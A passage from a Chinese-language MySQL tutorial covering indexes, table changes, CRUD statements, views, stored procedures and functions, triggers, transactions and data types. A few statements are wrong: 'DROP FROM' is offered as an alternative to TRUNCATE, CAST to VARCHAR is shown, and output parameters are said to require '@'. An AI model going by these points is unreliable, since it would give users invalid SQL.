KEY）自动创建唯一索引。每个MySQL表只能有一个主键。\n\n唯一索引： 唯一索引（UNIQUE INDEX）不允许任何重复值。它们可以是主键，也可以不是。\n唯一索引（Unique Index）的设置：\n\n在创建表时定义唯一索引：\nCREATE TABLE table_name (  column1 data_type,  column2 data_type,  UNIQUE INDEX index_name (column1));\n\n在已存在的表上添加唯一索引：\nALTER TABLE table_nameADD UNIQUE INDEX index_name (column1);\n\n\n全文索引： 全文索引（FULLTEXT INDEX）用于全文搜索。只有CHAR、VARCHAR和TEXT列可以创建全文索引。\n\n\n使用索引的缺点：\n\n会占用额外的磁盘空间\n在执行插入、更新或删除操作时，索引也需要被更新，有耗时\n如果被创建索引的列中重复值较多，即使在该列上创建索引也不会提高处理速度\n\n显示表结构DESC或者DESCRIBE，用于显示指定表的列结构，包括列名、数据类型、是否允许NULL，以及其他关于列的信息。\n运行这个命令会返回以下信息：\n\nField：列的名称。\nType：列的数据类型和长度。\nNull：如果列可以包含NULL值，这个字段会显示”YES”，否则显示”NO”。\nKey：如果列是某种键，这个字段会显示键的类型。”PRI”表示主键，”UNI”表示唯一键，”MUL”表示这个列是一个非唯一索引，或者这个列是多个列的一部分，这些列作为复合主键或复合索引，也可能是外键。\nDefault：列的默认值。如果没有指定默认值，这个字段会显示NULL。\nExtra：其他的额外信息，例如，如果列被定义为AUTO_INCREMENT，这个字段就会显示”AUTO_INCREMENT”。\n\n命令如下：\nDESC 表名;\n\n输出示例：\n+-------+--------------+------+-----+---------+----------------+| Field | Type         | Null | Key | Default | Extra          |+-------+--------------+------+-----+---------+----------------+| id    | int(11)      | NO   | PRI | NULL    | auto_increment || name  | varchar(100) | YES  |     | NULL    |                |+-------+--------------+------+-----+---------+----------------+\n\n查看创建表的SQL语句\nSHOW CREATE TABLE语句\n\nSHOW CREATE TABLE语句可用于查看创建表的SQL语句，包括所有列、键和约束：\nSHOW CREATE TABLE table_name;\n\n返回结果示例：\nCREATE TABLE `employee` (  `id` int NOT NULL,  `emp_id` char(10) DEFAULT NULL,  `emp_name` varchar(10) DEFAULT NULL,  `manager_id` char(10) DEFAULT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n\n显示数据库中的所有表SHOW TABLES;\n\n修改表在MySQL中，可以使用ALTER TABLE语句来修改已经存在的表。使用ALTER TABLE命令修改列的结构，根据修改类型，可以使用带有CHANGE、MODIFY、ADD、DROP的语句。\n以下是一些常见的表修改操作：\n\n添加列：\nALTER TABLE table_nameADD column_name datatype;\n\n例如，如果想在students表中添加一个名为address的新列，可以这样做：\nALTER TABLE studentsADD address VARCHAR(255);\n\n把列添加到指定位置的命令格式：\nALTER TABLE 表名 ADD 列名 数据类型 AFTER 放在这个列之后;\n\n示例：\nALTER TABLE tb1 ADD birth DATETIME AFTER employeeId;\n\n删除列：\nALTER TABLE table_nameDROP COLUMN column_name;\n\n例如，如果想从students表中删除address列，可以这样做：\nALTER TABLE studentsDROP COLUMN address;\n\n修改列的数据类型：\nALTER TABLE table_nameMODIFY COLUMN column_name datatype;\n\n即使数据类型不变，也依然需要指定修改后的数据类型\n例如，如果想修改students表中age列的数据类型为SMALLINT，可以这样做：\nALTER TABLE studentsMODIFY COLUMN age SMALLINT;\n\n重命名列：\nALTER TABLE table_nameCHANGE COLUMN old_column_name new_column_name datatype;\n\n例如，如果想将students表中的email列重命名为email_address，可以这样做：\nALTER TABLE studentsCHANGE COLUMN email email_address VARCHAR(100);\n\n即使数据类型不变，也依然需要指定修改后的数据类型\n\n添加唯一键、主键或索引：\nALTER TABLE table_nameADD UNIQUE (column_name);ALTER TABLE table_nameADD PRIMARY KEY (column_name);ALTER TABLE table_nameADD INDEX index_name (column_name);\n\nALTER TABLE语句会锁定表，直到操作完成。\n\n\n复制表复制整张表在MySQL中，可以通过创建新表并从现有表中复制数据来复制表。下面是一种方法：\nCREATE TABLE new_table AS SELECT * FROM existing_table;\n\n在这里，new_table是想要创建的新表的名称，existing_table是想要复制数据的现有表的名称。这个操作将创建一个新表，并将现有表中的所有数据复制到新表中。\n需要注意的是，使用这种方法创建的新表不会包含现有表的索引、主键、唯一键和其他约束。如果需要复制这些属性，需要使用其他方法，例如先使用CREATE TABLE语句创建表和相应的约束，然后使用INSERT INTO ... SELECT语句复制数据：\nCREATE TABLE new_table LIKE existing_table; INSERT INTO new_table SELECT * FROM existing_table;\n\n在这个例子中，CREATE TABLE new_table LIKE existing_table;语句创建一个与现有表结构（包括索引和约束）完全相同的新表，但不包含任何数据。然后，INSERT INTO new_table SELECT * FROM existing_table;语句将现有表中的所有数据复制到新表中。\n复制符合条件的记录当另一个表已经存在时，可以使用 INSERT INTO SELECT 语句来从一个表复制符合条件的记录到另一个表中。具体来说，INSERT INTO SELECT 语句会将一个查询结果插入到指定的表中。\n以下是一个使用 INSERT INTO SELECT 语句复制符合条件的记录的示例如下：\nINSERT INTO newtable (col1, col2, ...)\tSELECT col1, col2, ...FROM oldtable\tWHERE condition;\n\n在这个例子中，我们把符合查询条件的列数据从旧表 oldtable 复制到新表 newtable。选择需要复制的列，并通过 WHERE 子句指定要复制的特定行。\n需要注意的是，在执行 INSERT INTO SELECT 语句之前，我们必须先创建新表，并保证它与旧表拥有相同的结构。此外，也可以为新表添加索引或其他约束，以确保数据完整性和查询性能。\n还可以在 SELECT 语句中使用 JOIN、GROUP BY、HAVING 等功能来实现更加复杂的查询操作。例如，我们可以使用 JOIN 连接多个表，并根据多个条件对记录进行筛选，最终将满足条件的记录插入到新表中。\n如果需要将一个表中符合条件的记录复制到一个新表中，并且该表不存在，可以使用以下语句：\nCREATE TABLE newtable\tSELECT col1, col2, ...FROM oldtable\tWHERE condition;\n\n这条 CREATE TABLE AS 语句会首先创建一个名为 newtable 的新表，然后将满足 WHERE 子句指定的条件的所有行从 oldtable 复制到新表中。\n需要注意的是，新表的列会自动继承 SELECT 列出的列的名称和数据类型。如果需要重新命名列或更改其数据类型，则可以使用 AS 或其他列定义语法来修改列属性。例如：\nCREATE TABLE newtable\tSELECT id AS new_id, name, CAST(age AS VARCHAR(10)) AS age_strFROM oldtable\tWHERE condition;\n\n在这个例子中，我们在 SELECT 语句中为新表定义了新的列名和数据类型，并将旧表的 id 列重命名为 new_id。最终，MySQL 将会根据 SELECT 语句的结果集自动创建新表的结构，并将所有符合条件的记录插入到新表中。\n删除表删除整张表在MySQL中，可以使用 DROP TABLE 语句来删除已经存在的表。以下是其基本语法：\nDROP TABLE table_name;\n\n在这里，table_name 是想要删除的表的名称。例如，如果想删除名为 students 的表，可以这样做：\nDROP TABLE students;\n\n此外，在目标表不存在的情况下执行DROP命令会发生错误，如果和IF EXISTS子句一起使用，就可以避免在试图删除不存在的表时出现错误。下面是如何使用它的语法：\nDROP TABLE IF EXISTS table_name;\n\n在这里，table_name是想要删除的表的名称。例如，如果想删除名为students的表，可以这样做：\nDROP TABLE IF EXISTS students;\n\n如果students表存在，上述语句将删除它。如果students表不存在，MySQL将发出一条警告，而不是一个错误，并允许查询继续。\n删除表内所有记录请注意，DROP TABLE 语句会永久删除表以及表中的所有数据，如果只是想删除表中的所有数据，但是想保留表的结构（例如列的定义和约束），应该使用 TRUNCATE TABLE 语句，在MySQL中，TRUNCATE是一个DDL（数据定义语言）语句，用于删除表中的所有记录如下：\nTRUNCATE TABLE table_name;\n\n或者使用如下命令也可以达到同样的效果：\nDROP FROM table_name;\n\n查询数据SELECT 列名1, 列名2... FROM 表名;\n\nSELECT * FROM 表名;\n\nSELECT &#x27;会将这段文字输出&#x27;\n\nSELECT (1+2)*3;\n\n插入记录在MySQL中，可以使用INSERT INTO语句向表中插入数据。以下是几个例子：\n\n插入完整的行数据：\n在这种情况下，需要提供表中每个列的值。\nINSERT INTO table_name (column1, column2, column3, ...)VALUES (value1, value2, value3, ...);\n\n例如，如果有一个名为students的表，它有id, name, age, email四个列，可以这样插入数据：\nINSERT INTO students (id, name, age, email)VALUES (1, &#x27;John Doe&#x27;, 20, &#x27;johndoe@example.com&#x27;);\n\n对于设置了AUTO_INCREMENT的列（如id列），如果在插入数据时省略该列，MySQL会自动为它分配一个值。\n\n插入特定列的数据：\n在这种情况下，只需要提供想插入的列的值。\nINSERT INTO table_name (column1, column2, ...)VALUES (value1, value2, ...);\n\n例如，如果只想插入students表中的name和email：\nINSERT INTO students (name, email)VALUES (&#x27;John Doe&#x27;, &#x27;johndoe@example.com&#x27;);\n\n插入多行数据：\n可以一次插入多行数据，只需在VALUES关键字后面列出所有的值。\nINSERT INTO table_name (column1, column2, ...)VALUES (value1, value2, ...),(value1, value2, ...),...;\n\n例如：\nINSERT INTO students (name, email)VALUES (&#x27;John Doe&#x27;, &#x27;johndoe@example.com&#x27;),(&#x27;Jane Doe&#x27;, &#x27;janedoe@example.com&#x27;);\n\n更新记录在MySQL中，可以使用UPDATE语句来更新已经存在的记录。以下是其基本语法：\nUPDATE table_nameSET column1 = value1, column2 = value2, ...WHERE condition;\n\n在这里，table_name是想要更新记录的表的名称，column1, column2, … 是想要更新的列的名称，value1, value2, … 是想设置的新值，condition是用于确定哪些记录应该被更新的条件。如果没有使用WHERE设置条件，列中的所有记录都会被替换掉，为防止这种情况发生，在启动MySQL监视器的时候，可以加上–safe-update选项，使用此选项后，如果没有WHERE条件就无法执行UPDATE或DELETE。\n以下是一个例子：\nUPDATE studentsSET age = 21, email = &#x27;newemail@example.com&#x27;WHERE name = &#x27;John Doe&#x27;;\n\n这个语句会在students表中找到所有名字为John Doe的记录，并将它们的age列设置为21，email列设置为newemail@example.com。\n如果省略了WHERE子句，UPDATE语句将更新表中的所有记录。\n删除记录在 MySQL 中，可以使用 DELETE 语句删除表中的记录。以下是一些常见的用法和语法：\n\n删除整个表中的所有记录\n\nDELETE FROM table_name;\n\n\n删除符合条件的记录\n\nDELETE FROM table_name WHERE condition;\n\n这条语句将会从表 table_name 中删除满足指定条件的记录。例如，下面的语句能够删除年龄大于 30 岁的人员信息：\nDELETE FROM person WHERE age &gt; 30;\n\n\n删除部分符合条件的记录\n\n有时候，我们可能只想删除表中的前几行数据，或者只删除满足某些条件的前几行数据。可以使用 LIMIT 子句来限制待删除的记录数。\n例如，以下语句将会删除表 person 中前 10 行记录：\nDELETE FROM person LIMIT 10;\n\n如果要删除符合条件的前 10 行数据，则可以如下写：\nDELETE FROM person WHERE age &gt; 30 ORDER BY id LIMIT 10;\n\n在这个例子中，我们选择指定了 WHERE 条件和排序方式，并使用 LIMIT 限制了最多删除 10 行记录。\n视图将SELECT结果像表一样保存下来的虚表就是视图。视图可以帮助简化复杂查询，提高查询性能。\n视图也可以和表一样进行SELECT、INSERT、UPDATE、DELETE……，操作结果会同步到基本表。任何更改基本表的操作（如INSERT、UPDATE或DELETE）也都会影响到视图的结果。\n创建视图使用CREATE VIEW语句可以在MySQL中创建视图。例如，以下是创建一个简单视图的示例：\nCREATE VIEW my_view ASSELECT column1, column2, ...FROM my_tableWHERE condition;\n\n在这个例子中，my_view是视图的名称，my_table是视图所依赖的基本表，SELECT查询表示视图的内容，并使用WHERE子句进行条件过滤。\n可更新视图在MySQL中，只有可更新视图（updatable view）才能使用UPDATE、INSERT或DELETE语句来更改基本表的行数据。\n当满足以下条件之一时，视图将被标记为不可更新：\n\n视图包含聚合函数（如SUM或AVG）。\n视图中使用了DISTINCT、GROUP BY或HAVING子句。\n视图中的SELECT语句包含UNION或UNION ALL操作符。\n视图定义中存在子查询，而且子查询引用了与SELECT语句所引用的不同表。\n视图定义中存在常量或表达式，而不是列名。\n\n对视图执行INSERT操作时，即使与创建视图时的WHERE条件不匹配，数据也会插入到基表中。\n比如创建视图时指定了sales的范围：\nCREATE VIEW v1 ASSELECT empid, salesFROM tbWHERE sales &gt;= 100;\n\nINSERT数据时不在这个范围内：\nINSERT INTO v1 VALUES(&#x27;new_empid&#x27;, 15);\n\n执行之后，虽然视图v1中没有(‘new_empid’, 15)这条数据，但是基本表中已经INSERT成功，存在了这条数据。\n为避免这种情况发生，可以将视图设置为”不接受与条件不匹配的记录“，在CREATE VIEW时，添加WITH CHECK OPTION：\nCREATE VIEW v1 ASSELECT empid, salesFROM tbWHERE sales &gt;= 100WITH CHECK OPTION;\n\n这样就无法插入不符合条件的记录了。\n显示视图视图在显示上的操作和表是相同的，也是通过SHOW TABLES命令操作，视图会与表一起显示出来。\n要查看视图的列结构也是和表一样的操作。显示视图view_name的列结构示例如下：\nDESC view_name;\n\n显示创建语句视图的SQL语句示例如下：\nSHOW CREATE VIEW view_name\n\n替换视图这里的替换视图的含义是删除已经存在的同名视图并创建新视图，操作方法是加上OR REPLACE：\nCREATE OR REPLACE VIEW v1 ASSELECT NOW();\n\n修改视图结构修改视图结构使用的也是ALTER命令，命令格式：\nALTER VIEW view_name AS (SELECT语句);\n\n删除视图如果存在就删除视图：\nDROP VIEW IF EXISTS v1;\n\nIF EXISTS的作用参见删除数据库。\n存储过程MySQL存储过程（Stored Procedure）是一组预编译的SQL语句集合，可以在数据库中重复运行使用。将多个SQL语句组合成一个只需要使用命令CALL 能执行的集合，该集合就称为存储过程（stored process）。\n创建存储过程存储过程由以下部分组成：\n\n存储过程名称：唯一标识存储过程的名称。\n\n参数列表：定义存储过程需要的输入或输出参数。\n\nSQL语句集合：实际执行的SQL语句集合。\n\n控制流程：定义存储过程如何处理条件、循环和异常等情况。\n\n\n以下是创建和使用MySQL存储过程的基本步骤：\n\n使用CREATE PROCEDURE语句创建存储过程：\n\nCREATE PROCEDURE procedure_name (IN input_parameter1 data_type1, IN input_parameter2 data_type2, OUT output_parameter data_type)BEGIN  -- SQL statements hereEND;\n\n其中，procedure_name为存储过程名称，input_parameter和output_parameter是存储过程的输入和输出参数，data_type指定了参数的数据类型。在BEGIN和END之间是定义的存储过程的SQL语句集合和控制流程。\n在MySQL中，创建存储过程需要使用DELIMITER语句指定分隔符。默认情况下，MySQL使用分号（;）作为SQL语句和命令的分隔符。如果没有修改分隔符，MySQL会第一个分号视为存储过程定义语句的结束符，会导致错误。\n可以使用DELIMITER语句定义新的分隔符，例如“$$”，然后在存储过程结束时再将分隔符重置为默认值：\nDELIMITER $$CREATE PROCEDURE my_procedure()BEGIN  -- SQL statements hereEND $$DELIMITER ;\n\n注意，在上面的示例中，我们将分隔符从默认的分号设置为两个美元符号“$$”。当存储过程定义完毕后，我们需要将分隔符重置成分号以便后续操作。\n调用存储过程CALL procedure_name(input_value1, input_value2, @output_value);\n\n其中，input_value1和input_value2是存储过程的传入参数值，@output_value是存储过程的输出参数。可以用SELECT语句检索@output_value的值。\n需要注意的是，MySQL存储过程支持条件、循环和异常处理等复杂的控制流程结构。存储过程可以将这些结构与SQL语句组合在一起，以完成特定的任务或操作。\n 存储过程的输出参数有个@的原因： \n在MySQL中，存储过程参数分为输入参数和输出参数。与输入参数不同，输出参数必须使用@前缀来声明。\n这是因为MySQL中的@符号表示用户定义变量（User-Defined Variables），可以在多个SQL语句之间传递值。当在存储过程中声明一个输出参数时，实际上是在创建一个用户定义变量，以便将结果从存储过程传递出去。\n例如，下面是一个简单的存储过程示例，它将两个整数相加，并将结果存储在输出参数中：\nCREATE PROCEDURE add_numbers(IN num1 INT, IN num2 INT, OUT result INT)BEGIN  SET result = num1 + num2;END;\n\n在执行该存储过程时，需要声明一个用户定义变量，并在调用存储过程时将其传递给输出参数：\nSET @output_value = 0;CALL add_numbers(10, 20, @output_value);SELECT @output_value;\n\n在上面的代码中，我们首先使用SET语句创建了一个名为@output_value的用户定义变量，并将其初始化为0。然后，我们调用了add_numbers存储过程，并将10和20作为输入参数传递给它。最后，我们使用SELECT语句检索输出参数的值。注意，我们使用了@前缀来引用输出参数。\n需要注意的是，在MySQL中，用户定义变量的作用域仅限于当前会话（Session）。这意味着在存储过程内部定义的用户定义变量不能在存储过程外部使用，反之亦然。\n显示存储过程要在MySQL中查看存储过程的定义，可以使用SHOW CREATE PROCEDURE语句。该语句将显示与存储过程相关的详细信息，包括存储过程名称、参数列表和SQL语句。\n以下是一个示例存储过程，它返回员工的姓名和薪水：\nCREATE PROCEDURE get_employee(IN employee_id INT, OUT employee_name VARCHAR(50), OUT employee_salary DECIMAL(10,2))BEGIN  SELECT name, salary INTO employee_name, employee_salary FROM employees WHERE id = employee_id;END;\n\n要查看该存储过程的定义，请执行以下语句：\nSHOW CREATE PROCEDURE get_employee;\n\n执行结果类似于下面的内容：\nProcedure: get_employeeCreate Procedure: CREATE PROCEDURE `get_employee`(IN employee_id INT, OUT employee_name VARCHAR(50), OUT employee_salary DECIMAL(10,2))BEGIN  SELECT name, salary INTO employee_name, employee_salary FROM employees WHERE id = employee_id;END\n\n其中，第一行显示了存储过程的名称（Procedure: get_employee），而第二行则显示了完整的CREATE PROCEDURE语句，包括存储过程的定义。\n需要注意的是，如果没有对存储过程具有足够的权限，SHOW CREATE PROCEDURE语句可能会返回“Access denied”错误。在这种情况下，需要确保已经授予了足够的权限，并且使用正确的MySQL用户来执行该语句。\n删除存储过程在MySQL中删除存储过程非常简单。可以使用DROP PROCEDURE语句来删除一个或多个存储过程。\n以下是删除名为get_employee的存储过程的示例：\nDROP PROCEDURE IF EXISTS get_employee;\n\n在这个示例中，我们使用了DROP PROCEDURE语句来删除名称为get_employee的存储过程。如果该存储过程不存在，它将不会产生任何影响。如果存在同名的存储过程，则该命令将永久删除该存储过程，而无法撤消操作。\nIF EXISTS的作用参见前面章节的删除数据库。\n存储函数MySQL有许多函数，但使用存储函数可以创建自定义的函数，所以存储函数也称为用户定义函数。\n存储函数（stored function）的操作方法和存储过程基本相同，与存储过程的唯一不同是，存储函数在执行后只会返回一个值。如果需要在SQL查询中计算一些复杂的表达式或逻辑，则可以使用存储函数来简化查询语句。\n存储函数可以接受零个或多个输入参数，并返回一个标量值（例如整数、字符串、日期等）。\n启用存储函数日志当log_bin_trust_function_creators为0时，用户不能创建或更新存储函数。log_bin_trust_function_creators是一个系统变量，用于控制是否记录创建存储函数（CREATE FUNCTION语句）的操作到二进制日志中。\n这个变量的默认值为0（关闭，OFF），这意味着MySQL不会将CREATE FUNCTION语句记录到二进制日志中。把log_bin_trust_function_creators设置为1，将允许用户创建和修改存储函数，并且这些操作也将被记录到二进制日志中。\n需要注意的是，即使log_bin_trust_function_creators被设置为1，用户也需要适当的权限才能够创建、修改或删除存储函数。这包括CREATE ROUTINE、ALTER ROUTINE和DROP ROUTINE等权限。如果用户没有这些权限，则无法执行相关操作。\n要启用log_bin_trust_function_creators，可以采用以下方法：\n\n使用SET\nSET GLOBAL log_bin_trust_function_creators = 1;\n\n\n\n修改my.cnf\n[mysqld]log_bin_trust_function_creators = 1\n\n要查看log_bin_trust_function_creators，可以采用以下方法：\nSHOW VARIABLES LIKE &#x27;log_bin_trust_function_creators&#x27;;\n\n创建存储函数以下是一个计算两个整数之和的示例存储函数：\nCREATE FUNCTION add_numbers(num1 INT, num2 INT) RETURNS INTBEGIN  DECLARE result INT; -- 语法是 DECLARE 变量名 数据类型  SET result = num1 + num2;   -- 或者使用SELECT INTO，示例：SELECT AVG(sales) INTO result FROM tb;  RETURN result;END;\n\n在这个示例中，我们定义了一个名为add_numbers的存储函数，它接受两个整数作为输入参数，并返回它们的和。在存储函数内部，我们使用DECLARE语句声明了一个名为result的局部变量，并将num1和num2的和赋值给它。最后，我们使用RETURN语句返回result的值。\n要调用该存储函数，请使用SELECT语句进行查询：\nSELECT add_numbers(10, 20);\n\n在此查询中，我们调用了add_numbers函数，并传递了10和20作为两个输入参数。该函数将返回它们的和，即30。\n需要注意的是，在MySQL中，存储函数应该具有确定性，也就是说，对于相同的输入参数，它应该始终返回相同的结果。此外，存储函数还应该具有不产生副作用的性质，也就是说，它不应该修改数据库中的数据。如果存储函数违反了这些规则，可能会导致不可预测的结果或安全问题。\n显示存储函数显示数据库中所有的存储函数可以使用MySQL的SHOW FUNCTION STATUS语句来显示所有定义在数据库中的存储函数。\n具体来说，该语句的语法如下：\nSHOW FUNCTION STATUS;\n\n执行该语句将返回包含以下列的结果集：\n\nDb：与存储函数相关联的数据库名称。\nName：存储函数的名称。\nType：函数类型（标量函数 [SCALAR FUNCTION]、聚合函数 [AGGREGATE FUNCTION]、窗口函数 [WINDOW FUNCTION]）。\nDefiner：函数创建者。\nModified：最近一次修改时间。\nCreated：创建时间。\nSecurity_type：安全模式。\n\n此外，还有其他可选的列，例如Comment和character_set_client。\n如果想查看特定的存储函数，需要在SHOW FUNCTION STATUS语句后面添加LIKE子句来指定要查询的模式，例如：\nSHOW FUNCTION STATUS LIKE &#x27;myfunction%&#x27;;\n\n上面的示例将返回名称以“myfunction”开头的所有存储函数。\n显示指定存储函数SHOW CREATE FUNCTION function_name;\n\n删除存储函数删除存储函数的语法格式是：\nDROP FUNCTION 存储函数名;\n\n触发器MySQL触发器（trigger）是一种数据库对象，它允许在特定的表上定义自动执行的操作，当满足触发器定义的条件时，该操作将自动触发。\n常见的使用场景包括：\n\n在记录插入&#x2F;更新&#x2F;删除操作时自动生成日志记录。\n在记录插入&#x2F;更新&#x2F;删除操作时同步到其他相关的表。\n在记录插入&#x2F;更新时进行验证或格式化等操作。\n\n需要注意的是，MySQL触发器在处理大量数据时可能会显著减慢数据库性能，因此应谨慎使用。\n创建触发器一个MySQL触发器包含以下几个部分：\n\n触发器名称：用于标识触发器的名称。\n关联表名称：需要关联到触发器的表名。\n事件类型：可以是INSERT、UPDATE或DELETE，表示在关联表中执行的操作类型。\n触发时间：可以是BEFORE或AFTER，指定何时执行触发操作。\n条件：指定触发操作的条件，可以使SQL语句中的WHERE子句。\n触发操作：在满足触发器条件时要执行的操作，可以是一条或多条SQL语句。\n\n下面是一个创建MySQL触发器的示例：\nCREATE TRIGGER my_triggerAFTER INSERT ON my_tableFOR EACH ROWBEGIN    -- 触发操作END;\n\n在上述示例中，创建了一个名为my_trigger的触发器，设置为在my_table表中进行插入操作之后自动调用。FOR EACH ROW关键字表示该操作针对每个插入的行都会执行一次。在BEGIN和END之间的代码块则是要执行的SQL语句操作。\nOLD、NEW关键字在MySQL触发器中，可以使用OLD和NEW关键字来获取一个操作（如 INSERT、UPDATE 或 DELETE）的旧值和新值。\n\nOLD.列名\nOLD.列名是对表处理前的列值\nINSERT事件类型没有OLD.列名\n\nNEW.列名\nNEW.列名是对表处理后的列值\nDELETE事件类型没有NEW.列名\n\n\n示例：\nCREATE TRIGGER delete_triggerBEFORE DELETE ON employeeFOR EACH ROWBEGIN    INSERT INTO log_table (id_log_table, emp_id_log_table) VALUES (OLD.id, OLD.emp_id);END;\n\n在上述示例中，OLD关键字被用于访问将要被删除信息的行（旧行）。在此案例中，每次将要删除一行之前，都会将此行的ID和列1插入一个名为log_table的表中。\n显示触发器如果想要显示MySQL数据库中的触发器，可以使用以下命令：\nSHOW TRIGGERS;\n\n当执行上述命令时，将返回包含所有已创建触发器的结果集。该结果集包括每个触发器的名称、关联表、事件类型、触发时间和触发语句。\n如果只想检索指定表的触发器，则可以使用以下语法：\nSHOW TRIGGERS FROM your_database_name LIKE &#x27;your_table_name&#x27;;\n\n删除触发器要删除一个已经存在的MySQL触发器，可以使用以下语法：\nDROP TRIGGER [IF EXISTS] trigger_name;\n\n事务将多个操作作为单个逻辑工作单元处理的功能称为事务（transaction）。\n将事务在内存中的处理结果反映到数据库磁盘的操作称为提交（commit）。不反映到数据库磁盘中而是保持为原来状态的操作称为回滚（rollback）。\n开启事务如果多个操作需要一起进行，可以将其放在一个事务中，以保证所有操作都要么全部成功，要么全部失败。\n在MySQL中，使用以下语句来开始一个事务：\nSTART TRANSACTION;-- 或者 BEGIN;-- 或者 BEGIN WORK;\n\nBEGIN和BEGIN WORK命令也可以用于开启一个新的事务。它们与START TRANSACTION命令作用相同，都可以开启一个新的事务，让后续的SQL语句在这个事务内执行。\n提交事务如果所有的操作都成功了，则使用以下语句来提交事务\nCOMMIT;\n\n在MySQL中，有一个自动提交（autocommit）功能，默认情况下开启。当执行单个SQL语句时，会自动将该语句的修改内容提交到数据库，即将其作为一个事务进行处理。\n如果需要关闭自动提交功能，则可以使用以下命令：\nSET autocommit = 0;\n\n这样，在执行多个SQL语句时，就需要手动调用START TRANSACTION或BEGIN、BEGIN WORK命令开始一个新的事务，再通过COMMIT日提交事务。例如：\nSET autocommit = 0;-- 开始一个新的事务BEGIN;-- 执行一些SQL语句INSERT INTO table1 (column1, column2) VALUES (value1, value2);-- 判断是否发生错误IF some_error_occured THEN    -- 回滚事务    ROLLBACK;ELSE    -- 提交事务    COMMIT;END IF;\n\n以上代码首先关闭了自动提交功能，然后使用BEGIN命令开始了一个新的事务，在其中执行了一些SQL语句，并根据情况选择了提交或回滚事务。\n回滚事务在MySQL中，使用ROLLBACK命令回滚事务，例如：\n-- 开始一个事务START TRANSACTION;-- 在事务中执行一系列的数据库操作-- 判断是否需要回滚事务IF some_condition THEN  -- 回滚事务  ROLLBACK;ELSE  -- 提交事务  COMMIT;END IF;\n\n在这个例子中，使用ROLLBACK回滚事务。\nBEGIN WORK;-- 或者 BEGIN;-- 或者 START TRANSACTION;-- 执行一些SQL操作SAVEPOINT sp1;-- 执行一些SQL操作ROLLBACK TO SAVEPOINT sp1;-- 执行一些SQL操作COMMIT;\n\n以上示例中，除了使用ROLLBACK命令回滚事务之外，还涉及到了MySQL事务中的保存点（SAVEPOINT）概念。保存点是指在事务内定义的一个标记，用于标识事务内某个时刻的状态。当事务遇到错误并进行回滚时，可以将事务恢复到保存点所标识的状态。\n数据类型MySQL数据库表列中的数据的种类称为MySQL的数据类型。\n二进制数据类型\n\n\n数据类型\n含义\n对应范围\n\n\n\nBLOB\n存储二进制大型对象的数据类型\n最多可以存储65535个字节\n\n\n数值型数据类型\n\n\n数据类型\n含义\n对应范围\n\n\n\nTINYINT\n极小整数值\n-128 到 127（有符号），0 到 255（无符号）\n\n\nSMALLINT\n小整数值\n-32,768 到 32,767（有符号），0 到 65,535（无符号）\n\n\nMEDIUMINT\n中等大小的整数值\n-8,388,608 到 8,388,607（有符号），0 到 16,777,215（无符号）\n\n\nINT\n常规大小的整数值\n-2,147,483,648 到 2,147,483,647（有符号），0 到 4,294,967,295（无符号）\n\n\nBIGINT\n非常大的整数值\n-9,223,372,036,854,775,808 到 9,223,372,036,854,775,807（有符号），0 到 18,446,744,073,709,551,615（无符号）\n\n\nFLOAT\n单精度浮点数\n精度（决定了能够存储的总位数，包括小数点左边和右边的数）是 7 位\n\n\nDOUBLE\n双精度浮点数\n精度是 15 位\n\n\nDECIMAL\n精确的小数值，用于存储精确的数值，如货币\n精度是 65 位\n\n\n输入的数值型数据可以采用指数表示法输入，在指数表示法输入的情况下，“AEB”表示“A乘以10的B次方”，B可以为任何整数（负数、零、正数），例如“6.02*10的23次方”可以表示为“6.02E+23”。\n字符串型数据类型\n\n\n数据类型\n含义\n对应范围\n\n\n\nCHAR\n定长字符串，长度固定\n0 到 255 字节\n\n\nVARCHAR\n变长字符串，长度可变\n0 到 65,535 字节\n\n\nTINYTEXT\n很小的文本字符串\n0 到 255 字节\n\n\nTEXT\n小到中等大小的文本字符串\n0 到 65,535 字节\n\n\nMEDIUMTEXT\n中等大小的文本字符串\n0 到 16,777,215 字节\n\n\nLONGTEXT\n大文本字符串\n0 到 4,294,967,295 字节\n\n\nENUM\n字符串对象，只能有一组预定义的值，并且值的数量不能超过 65535\n1 或 2 字节，根据枚举值的数量\n\n\nSET\n字符串对象，可以有多个值，值的数量不能超过 64\n1、2、3、4 或 8 字节，根据集合值的数量\n\n\n输入的字符串如果有“’”，需要转义处理，改为“\\‘”\nMySQL4.1版本之后，VARCHAR和CHAR的()中指定的位数单位变为“字符”，以VARCHAR(10)为例，不管输入的是中文还是英文还是数字，最多只能保留10个字符\nVARCHAR的字符范围：\n在MySQL 5.0.3及更高版本中，VARCHAR可以存储最多65535字节的数据，这包括存储长度的1到2个字节。实际的最大字符串长度由最大行大小（默认为65535字节）和使用的字符集决定。\n例如，如果使用utf8字符集（最多需要3字节来存储一个字符），则VARCHAR可以存储最多21845个字符（65535&#x2F;3，舍去小数）。如果使用utf8mb4字符集（最多需要4字节来存储一个字符），则VARCHAR可以存储最多16383个字符（65535&#x2F;4，舍去小数）。\n在MySQL 5.0.2及更低版本中，VARCHAR最多只能存储255个字符。\n日期和时间型数据类型\n\n\n数据类型\n含义\n对应范围\n\n\n\nYEAR\n年份\n1901 到 2155（4位时），以及19702069（2位时，7069）\n\n\nDATE\n日期\n‘1000-01-01’ 到 ‘9999-12-31’\n\n\nTIME\n时间\n‘-838:59:59’ 到 ‘838:59:59’\n\n\nDATETIME\n日期和时间组合\n‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’\n\n\nTIMESTAMP\n时间戳\n‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC\n\n\nMySQL中的时间类型还支持小数秒，例如 DATETIME(3)、TIME(3) 或 TIMESTAMP(3) 可以存储精确到毫秒的时间。在括号中的数字表示小数秒的精度。\n在MySQL中，TIMESTAMP和DATETIME数据类型共享相同的格式来存储和显示日期和时间值（YYYY-MM-DD 